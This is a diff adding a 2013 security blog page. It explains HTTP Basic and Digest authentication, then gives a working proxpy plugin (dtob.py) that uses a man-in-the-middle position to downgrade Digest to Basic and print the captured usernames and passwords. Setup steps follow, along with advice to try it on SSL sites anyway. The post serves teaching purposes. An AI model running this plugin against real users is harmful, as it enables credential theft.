@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>dtob.py: Digest to Basic authentication; A simple example of a authentication &#39;downgrade&#39; attack &middot; </title>
+
+  
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="http://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="http://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
+             alt="gravatar" title="">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/">Home</a></li>
+      
+      <li class="sidebar-nav-item"><a href="http://leonjza.github.io/about/">About</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2016 <a href="http://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>dtob.py: Digest to Basic authentication; A simple example of a authentication &#39;downgrade&#39; attack</h1>
+    <span class="post-date">Jun 25, 2013 &middot; 11 minute read &middot; <a href="http://leonjza.github.io/2013/06/25/dtob-dot-py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="http://leonjza.github.io/categories/proxy">proxy</a><a class="label" href="http://leonjza.github.io/categories/digest-authentication">digest authentication</a><a class="label" href="http://leonjza.github.io/categories/basic-authentication">basic authentication</a><a class="label" href="http://leonjza.github.io/categories/mitm">mitm</a>
+    </span>
+    
+
+<h3 id="introduction:3a8a7cfcb004211ced9b129bed192f64">Introduction</h3>
+
+<p>Lets start by saying that I am by <em>no</em> means an expert at any of what I am about to write. Primarily this post is purely for research purposes. Think of it as one of those <em>something to do</em> scenarios. I&rsquo;d like to cover some basics around HTTP Authentication, and then show a PoC of how this can be abused in a real world scenario. Hopefully this will help educate people to use more secure authentication mechanisms! :)</p>
+
+<h3 id="authentication-at-a-http-level:3a8a7cfcb004211ced9b129bed192f64">Authentication at a HTTP Level</h3>
+
+<p>HTTP Level authentication, for the most part, rely on a set of headers to authenticate the user. Generally speaking, the server will present the expected authentication mechanism via a <code>WWW-Authenticate</code> header, and expect the client to prepare the correct response back. Each request the user makes after a successful authentication attempt, has to contain the correct headers for the applicable authentication scheme, else the server would normally respond with a <code>401 - Not Authorised</code>, and the client has to re-authenticate. It is up to the server/application to validate the headers on each request.
+HTTP level authentication mechanisms include <a href="http://tools.ietf.org/html/rfc2617#section-2">Basic</a>, <a href="http://tools.ietf.org/html/rfc2617#section-3">Digest</a> as well as more complex schemes such as <a href="http://tools.ietf.org/html/rfc4559">Kerberos</a>, <a href="http://davenport.sourceforge.net/ntlm.html#ntlmHttpAuthentication">NTLM</a> and <a href="http://oauth.net/core/1.0/#auth_header">OAuth</a></p>
+
+<p>It is important to note that even though you are using say, Digest authentication, it is entirely up to the backend systems to <strong>validate</strong> the credentials. Whether it is some backend database, RADIUS server, LDAP etc. that stores your valid set of credentials does not matter. The server and the client, on a HTTP level, will be exchanging these headers.</p>
+
+<p>For the purpose of this article, I will focus a little on the arguably less complex mechanisms, Basic and Digest.</p>
+
+<h3 id="http-basic-authentication:3a8a7cfcb004211ced9b129bed192f64">HTTP Basic Authentication</h3>
+
+<p>Basic authentication is considered the <em>least secure</em> method of HTTP authentication. Why is this exactly? Well, the credentials used to authenticate you as a user is sent over the wire in a Base64 encoded string. Base64 is a <strong>encoding</strong> scheme, and <strong>not</strong> an encryption scheme [<a href="http://en.wikipedia.org/wiki/Base64">1</a>].</p>
+
+<p>To demonstrate this, lets assume we have a website that wants to make use of basic authentication. A sample request header would look like:</p>
+
+<pre><code>GET /auth/basic/ HTTP/1.1
+Host: test.dev
+Proxy-Connection: keep-alive
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+DNT: 1
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8,af;q=0.6
+</code></pre>
+
+<p>The website, configured to use basic authentication, will see that there is no <code>Authorisation</code> header presented by the client, and respond with a <code>401</code>, as well as a <code>WWW-Authenticate</code> header.</p>
+
+<pre><code>HTTP/1.0 401 Unauthorised
+Date: Tue, 25 Jun 2013 17:33:37 GMT
+Server: Apache/2.2.22 (Unix) DAV/2 PHP/5.3.15 with Suhosin-Patch mod_ssl/2.2.22 OpenSSL/0.9.8x
+X-Powered-By: PHP/5.3.15
+WWW-Authenticate: Basic realm=&quot;Basic Auth Testing&quot;
+Content-Length: 39
+Connection: close
+Content-Type: text/html
+
+Text to send if user hits Cancel button
+</code></pre>
+
+<p>The response we got when attempting to access the website told us that we need to provide a authentication response first. Based on the <code>WWW-Authenticate</code> header, this mechanism should be <code>Basic</code> for the realm <em>Basic Auth Testing</em>. Don&rsquo;t stress too much about the realm part. In short, this is usually used to give the user a short message like &ldquo;Restricted Area&rdquo; etc.
+In the authentication dialog that the browser presents, we provide some credentials, and submit them for processing. Your browser now goes and prepares the <code>Authorisation</code> header.</p>
+
+<pre><code>GET /auth/basic/ HTTP/1.1
+Host: test.dev
+Proxy-Connection: keep-alive
+Cache-Control: max-age=0
+Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36
+DNT: 1
+Accept-Encoding: gzip,deflate,sdch
+Accept-Language: en-US,en;q=0.8,af;q=0.6
+</code></pre>
+
+<p>Because my credentials are correct, the server will respond now with a <code>200</code> and serve the content. But, lets take a quick step back and check out what is actually in this header. More specifically, check out the <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code> part.
+This header now needs to be present in every request that is made to the website. If for whatever reason the credentials are no longer valid, the server/application will usually respond with a <code>401</code> again, and the authentication will re-occur. The user normally does not have to do anything, as the browser will automatically include the Authorization header in every request.</p>
+
+<h4 id="ok-so-what:3a8a7cfcb004211ced9b129bed192f64">Ok, so what?</h4>
+
+<p>So lets take a moment and relook at the <code>Authorisation</code> header. <code>Authorisation: Basic dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>
+Lets strip the <em>Authorisation: Basic</em> section and just work with the <code>dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk</code>. We will echo this, and pipe it through a base64 decoder in a shell session:</p>
+
+<pre><code class="language-bash">$ echo &quot;dXNlci5uYW1lOnMzY3IzdFBAc3N3MHJk&quot; | base64 -d
+user.name:s3cr3tP@ssw0rd
+$
+</code></pre>
+
+<p>Yup, thats it&hellip;</p>
+
+<p>It is now clear to see that for HTTP Basic authentication, the browser will take the credentials that the user has provided, and create the header in the format:
+<code>Authorisation: Basic</code> + <strong>base64(username:password)</strong>. If you are protecting a non-SSL web resource with this authentication mechanism, you are essentially asking your users to send their credentials unencrypted over the wire to you for every requset.</p>
+
+<h3 id="http-digest-authentication:3a8a7cfcb004211ced9b129bed192f64">HTTP Digest Authentication</h3>
+
+<p>Digest authentication is considered to be <em>more</em> secure, as it actually applies a hash function to the credentials, before passing the header on to the server. For the sake of brevity, lets assume the server will act in a similar fashion to the Basic Authentication example above, except, the <code>WWW-Authenticate</code> and <code>Authorisation</code> headers are completely different. You are of course welcome to check it out yourself, and I would encourage you do so!</p>
+
+<p>Lets look at an example, and then dig into the details. Requesting a digest protected web resource @<em>/login</em> without a valid <code>Authorisation</code> header, will cause our sample application to respond with a <code>401</code> and a <code>WWW-Authenticate</code> header as follows:</p>
+
+<pre><code>WWW-Authenticate: Digest realm=&quot;test.dev&quot;,qop=&quot;auth&quot;,nonce=&quot;064af982c5b571cea6450d8eda91c20d&quot;,opaque=&quot;d8ea7aa61a1693024c4cc3a516f49b3c&quot;
+</code></pre>
+
+<p>Just as the Basic example, the browser will prompt the user for credentials now and prepare the response. The response then to the server would include the following <code>Authorisation</code> header:</p>
+
+<pre><code>Authorisation: Digest username=&quot;user.name&quot;, realm=&quot;test.dev&quot;, nonce=&quot;064af982c5b571cea6450d8eda91c20d&quot;, uri=&quot;/login&quot;, response=&quot;70eda34f1683041fd9ab72056c51b740&quot;, opaque=&quot;d8ea7aa61a1693024c4cc3a516f49b3c&quot;, qop=auth, nc=00000001, cnonce=&quot;61417766e50cb980&quot;
+</code></pre>
+
+<p>Clearly the response here is much more complex when compared to the Basic example. So, lets refer to the Wikipedia Article <a href="http://en.wikipedia.org/wiki/Digest_access_authentication#Overview">here</a>, or the official RFC <a href="http://tools.ietf.org/html/rfc2069#section-2.1.2">here</a> to help us understand what is going on here.</p>
+
+<p>According to the Wikipedia article, the response <code>Authorisation</code> header for Digest authentication for <a href="http://tools.ietf.org/html/rfc2617#section-3.2.2">RFC 2617</a> is calculated as follows:</p>
+
+<pre><code class="language-bash"># If the algorithm directive in the WWW-Authenticate header is 'MD5' or unspecified
+ha1 = md5(username : realm : password)
+# Else, if the algorithm directive is 'MD5-Sess', the nonce and client nonce becomes part of ha1
+ha1 = md5(md5(username : realm : password) : nonce : cnonce)
+
+# For ha2, if the qop directive is 'auth' or unspecified
+ha2 = md5(method : digestURI)
+# Else, if the qop directive is 'auth-int'
+# Where entity body is the actual response HTML from the doctype down to the last &lt;/html&gt;. See: http://www.w3.org/Protocols/rfc2616/rfc2616-sec7.html#sec7  
+ha2 = md5(method : digestURI : md5(entityBody))
+
+# Lastly, for the response, if the qop directive is 'auth' or 'auth-int'
+response = md5(ha1 : nonce : nonceCount : clientNonce : qop : ha2)
+# Else, if qop is unspecified 
+response = md5(ha1 : nonce : ha2)
+</code></pre>
+
+<p>So, lets take this formula, step by step and try and replicate the response <code>Authorisation</code> header in a shell. If one of the <code>WWW-Authenticate</code> headers don&rsquo;t make sense then I&rsquo;ll highly reccomend you read the RFC.</p>
+
+<p>```bash Example of Calculating a Digest Authentication Response header in a shell with a qop of &ldquo;auth&rdquo;</p>
+
+<h1 id="assign-some-values-to-variables-these-values-will-come-from-the-above-headers:3a8a7cfcb004211ced9b129bed192f64">Assign some values to variables. These values will come from the above headers</h1>
+
+<p>qop=&ldquo;auth&rdquo;
+realm=&ldquo;test.dev&rdquo;
+nonce=&ldquo;064af982c5b571cea6450d8eda91c20d&rdquo;
+uri=&ldquo;/login&rdquo;
+cnonce=&ldquo;61417766e50cb980&rdquo;
+nc=&ldquo;00000001&rdquo;
+username=&ldquo;user.name&rdquo; # This is what the user enters
+password=&ldquo;s3cr3tP@ssw0rd&rdquo; # This is what the user enters
+method=&ldquo;GET&rdquo;</p>
+
+<h1 id="start-off-with-calculating-ha1:3a8a7cfcb004211ced9b129bed192f64">Start off with calculating ha1.</h1>
+
+<h1 id="we-do-not-have-the-algorithm-directive-specified-so-ha1-is-calculated-as:3a8a7cfcb004211ced9b129bed192f64">We do not have the algorithm directive specified, so ha1 is calculated as:</h1>
+
+<p>$ ha1=<code>echo -n $username&quot;:&quot;$realm&quot;:&quot;$password | md5</code></p>
+
+<h1 id="confirm-that-the-value-is-set:3a8a7cfcb004211ced9b129bed192f64">Confirm  that the value is set.</h1>
+
+<p>$ print $ha1
+d5d7ef83a9b3ad5bb0b5201b2bace033</p>
+
+<h1 id="next-calculate-the-value-of-ha2:3a8a7cfcb004211ced9b129bed192f64">Next calculate the value of ha2.</h1>
+
+<h1 id="our-application-presented-the-qop-directive-as-auth-so-ha2-is-calculated-as:3a8a7cfcb004211ced9b129bed192f64">Our application presented the qop directive as &lsquo;auth&rsquo;, so ha2 is calculated as:</h1>
+
+<p>$ ha2=<code>echo -n $method&quot;:&quot;$uri | md5</code></p>
+
+<h1 id="again-confirm-that-its-set:3a8a7cfcb004211ced9b129bed192f64">Again, confirm that its set.</h1>
+
+<p>$ print $ha2
+315c3fb2f18fd4c6e5a3175e489464ad</p>
+
+<h1 id="with-both-ha1-and-ha2-set-we-can-calculate-the-response:3a8a7cfcb004211ced9b129bed192f64">With both &lsquo;ha1&rsquo; and &lsquo;ha2&rsquo; set, we can calculate the response</h1>
+
+<h1 id="we-have-the-qop-directive-specified-so-our-response-is-calculated-as:3a8a7cfcb004211ced9b129bed192f64">We have the qop directive specified, so our response is calculated as:</h1>
+
+<p>$ response=<code>echo -n $ha1&quot;:&quot;$nonce&quot;:&quot;$nc&quot;:&quot;$cnonce&quot;:&quot;$qop&quot;:&quot;$ha2 | md5</code></p>
+
+<h1 id="and-did-we-get-the-right-response:3a8a7cfcb004211ced9b129bed192f64">And did we get the right response?</h1>
+
+<p>$ print $response
+70eda34f1683041fd9ab72056c51b740</p>
+
+<pre><code>
+`70eda34f1683041fd9ab72056c51b740` is the valid `response` header for this request. Note that the next client request will set `nc=00000002` and therefore the response will be different due to this value being part of the response calculation. However, the fact remains that the authorisation is continuously done via header exchanges between the client and the server, relying on the server to validate them.
+
+It is also clear that this can not be easily reversed. Even though some attributes that make up the hash function are known, the username and password are at least hashed and factored into the response attribute. It is not impossible, though not as easy as Basic authentication.
+
+### O..K.. so I now get how the Basic vs Digest stuff works, whats next?
+What if we could make the browser think that the server wants basic authentication, and then capture the encdoded credentials? That would mean we dont need any l33t cracking skeelz or anything. Just a `base64 -d`.
+
+### Downgrade all the auth!
+Assuming you are able to get some form of MiTM between the client and the server, by whichever means you use, we can intercept the headers and change them to tell the browser that we actually want basic authentication. Remember, the browser responds based on what the server asks, so if the server only asks for Basic authentication... :D
+
+&quot;Downgrade&quot; attacks are a known flaw in Digest authentication. Where Digest authentication is not necessarily vulnerable to MiTM attacks in the sense that the hash still needs to be cracked, Basic authentication is and therefore such an attack can prove to be valuable to an attacker.
+
+### Enough talk, PoC!
+Using [proxpy](https://code.google.com/p/proxpy/), which is a pluggable python proxy server, I wrote a PoC demoing this exact attack. There are a lot of scenarios where this doesn't work very well, but this is only meant to demonstrate the problem.
+
+#### The plugin
+
+```python dtob.py
+# dtob.py
+# Digest to Basic downgrade attack PoC plugin for proxpy (https://code.google.com/p/proxpy/)
+#
+# 2013 Leon Jacobs
+# Licensed under IDC (I don't Care) license.
+import base64
+import hashlib
+
+def headerCleanup(v):
+
+    # strip annoying bracket things
+    v = v.translate(None, &quot;'[\\'&quot;)
+    v = v.translate(None, &quot;\\']'&quot;)
+
+    # convert it to a list
+    headers = v.split(', ')
+
+    return headers
+
+def proxy_mangle_request(req):
+
+    v = str(req.getHeader(&quot;Authorization&quot;))
+
+    headers = headerCleanup(v)
+
+    if 'Basic' in headers[0]:
+        print &quot;[*] Basic Auth Response Detected.&quot;
+        credentials = headers[0].split(&quot; &quot;)
+        credentials = base64.b64decode(credentials[1]).split(&quot;:&quot;)
+        print &quot;[!] Found username '%s' and password '%s' for URL %s&quot; % (credentials[0], credentials[1], str(req.url))
+
+    if 'Digest' in headers[0]:
+        print &quot;[x] Aww, the client responded with a Digest. \&quot;Were too late!\&quot; :(&quot;
+
+    return req
+
+def proxy_mangle_response(res):
+
+    v = str(res.getHeader(&quot;WWW-Authenticate&quot;))
+
+    headers = headerCleanup(v)
+
+    if 'Digest' in headers[0]:
+
+        # Swap out Digest for Basic :&gt;
+        header = str(headers[0])
+        print &quot;[*] Found digest auth. Masquerading the response with a basic one :&gt;&quot;
+        res.setHeader(&quot;WWW-Authenticate&quot;, &quot;Basic realm=pwnd&quot;)
+
+    return res
+</code></pre>
+
+<p>Lets get to it.</p>
+
+<ol>
+<li><p>At the core, this authentication downgrade attack PoC leverages off the ability to perform a MiTM between the client and server. How you get this MiTM is out of the scope of this article, but bear in mind that MiTM is not <strong>just</strong> arp spoofing clients. You could NAT web traffic to your proxy too&hellip; :)</p></li>
+
+<li><p>Download <a href="https://code.google.com/p/proxpy/">proxpy</a> and extract it to a working directory.</p></li>
+
+<li><p>Download and save the plugin from <a href="https://gist.github.com/th3l33k/5868963/raw/8b20c879ad68cd46fd470b86f9bdc7f33da4b097/dtob.py">here</a> into the <code>plugins/</code> directory in your proxpy working directory.</p></li>
+
+<li><p>Start the proxy, specifying the port you&rsquo;d like it to run on, as well as telling it to load the plugin.
+A sample command to get this running would be: <code>python proxpy.py -p 8090 -x plugins/dtob.py</code></p></li>
+
+<li><p>Ensure that your MiTM is successful, and watch as digest authentication gets downgraded to basic auth, and your credentials echoed to the terminal :P Something like this&hellip;</p></li>
+</ol>
+
+<p>{% img <a href="http://i.imgur.com/NQFboBV.png">http://i.imgur.com/NQFboBV.png</a> %}</p>
+
+<h3 id="what-is-the-user-experience-with-this:3a8a7cfcb004211ced9b129bed192f64">What is the user experience with this?</h3>
+
+<p>That is a good question. The actual dialog that the user sees, again, is up to the browser to render. Depending on <strong>which</strong> browser you use on <strong>which</strong> OS, this may look different. In the back, the client <em>should</em> function normally, blissfully unaware that the headers for stronger authentication were swapped out.</p>
+
+<p>On my computer, the authentication dialog has the follow look and feel:</p>
+
+<p>{% img <a href="http://i.imgur.com/9NTWg0W.png">http://i.imgur.com/9NTWg0W.png</a> %}</p>
+
+<p>Notice the &ldquo;Server Says:&rdquo; Section. This is typically the <code>realm</code> part of the authentication request. When using the <code>dtob.py</code> plugin, it is changed to <code>pwnd</code>. This dialog looks no different when using any form of HTTP based authentication. Hence, when the downgrade attack occurs, the user is unaware that anything different is happening in the background.</p>
+
+<h3 id="to-wrap-it-up:3a8a7cfcb004211ced9b129bed192f64">To wrap it up</h3>
+
+<p>A few things to note here. Regardless of the HTTP Authentication method used, the client will not know <em>which</em> authentication method is actually being used without inspecting the headers etc. The plugin can technically be written to keep track of which URL&rsquo;s require Digest auth, and prepare valid responses ( like the one we did in the shell ) and present that back to the server. This will make the process completely smooth and the client unaware that something is going on. In the plugins current state, it will just continuously prompt the user for authentication as the proper request with the correct <code>Authorisation</code> header is never sent to the server.</p>
+
+<p>On the case of SSL websites it obviously gets a little more tricky. Don&rsquo;t be put off with this. <strong>Countless</strong> times have I seen where users simply click the &ldquo;proceed anyways&rdquo; button regardless of the certificate validation errors that the browser presents them with. So, even though you will raise alarms on SSL encrypted websites, its still worth a try ^^</p>
+
+  </div>
+  <div id="disqus_thread"></div>
+</div>
+
+
+<script type="text/javascript">
+var disqus_shortname = "slashnote";
+(function () {
+    var s = document.createElement('script'); s.async = true;
+    s.type = 'text/javascript';
+    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+}());
+</script>
+
+
+
+<script type="text/javascript">
+    var disqus_shortname = "slashnote";
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+<script src="http://leonjza.github.io/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
+  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
+  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
+  s.parentNode.insertBefore(g,s)}(document,'script'));
+</script>
+
+</body>
+</html>
+
